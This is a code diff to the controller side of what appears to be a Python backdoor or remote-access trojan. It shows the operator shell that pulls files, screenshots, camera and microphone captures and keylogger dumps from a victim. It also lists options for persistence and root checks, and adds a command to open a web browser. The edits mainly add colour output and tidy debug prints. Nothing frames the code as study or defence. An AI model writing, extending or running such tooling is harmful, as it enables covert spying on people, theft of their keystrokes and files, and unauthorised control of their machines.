@@ -101,6 +101,10 @@ def shell():
     global cs_count
     global vd_count
     global mc_count
+
+    OKGREEN = '\033[92m'
+    WARNING = '\033[91m'
+    ENDC = '\033[0m'
     stop_threads = False
     stream_thread = threading.Thread(target=stream, args =(lambda : stop_threads, ))
 
@@ -125,9 +129,10 @@ def shell():
                     persistance        ==> Make the backdoot persistant
                     check              ==> Check for root privileges 
                     wallpaper <path>   ==> Change the wallpaper  
+                    webbrowser <url>   ==> Open a web browser
                     q                  ==> quit session
                     =================================================================\n'''
-            print(options)
+            print(OKGREEN+options+ENDC)
 
         elif command[:2] == "cd" and len(command) > 1:
             continue
@@ -135,6 +140,9 @@ def shell():
         elif command[:8] == "download":
             with open(command[9:], "wb") as file:
                 result = recv_file()
+                err=result[:15].decode()
+                if err[:11]=="[!!] Failed":
+                    print(WARNING+result.decode()+ENDC)
                 file.write(result)
 
         elif command[:6] == "upload":
@@ -149,7 +157,7 @@ def shell():
                 image = recv_file()
                 image_decoded = image
                 if image_decoded[:4] == "[!!]":
-                    print(image_decoded)
+                    print(WARNING+ image_decoded+ ENDC)
                 else:
                     screen.write(image_decoded)
                     sc_count += 1
@@ -159,7 +167,7 @@ def shell():
                 image = recv_file()
                 image_decoded = image
                 if image_decoded[:4] == "[!!]":
-                    print(image_decoded)
+                    print(WARNING+ image_decoded+ ENDC)
                 else:
                     screen.write(image_decoded)
                     cs_count += 1
@@ -169,7 +177,7 @@ def shell():
                 image = recv_file()
                 image_decoded = image
                 if image_decoded[:4] == "[!!]":
-                    print(image_decoded)
+                    print(WARNING+ image_decoded+ ENDC)
                 else:
                     screen.write(image_decoded)
                     vd_count += 1
@@ -179,7 +187,7 @@ def shell():
                 image = recv_file()
                 image_decoded = image
                 if image_decoded[:4] == "[!!]":
-                    print(image_decoded)
+                    print(WARNING+ image_decoded+ ENDC)
                 else:
                     screen.write(image_decoded)
                     mc_count += 1
@@ -196,9 +204,7 @@ def shell():
             continue
 
         elif command[:11] == "dump_keylog":
-            print("we're in")
             with open("logger.txt", "wb") as sc:
-                print("am here too")
                 img = recv_file()
                 sc.write(img)
 
@@ -207,7 +213,11 @@ def shell():
 
         else:
             result = reliable_recv()
-            print(result)
+            if result[:4] == "[!!]":
+                print(WARNING+ result+ ENDC)
+            else:
+                print(OKGREEN+ result+ ENDC)
+                
 
 
 def server():
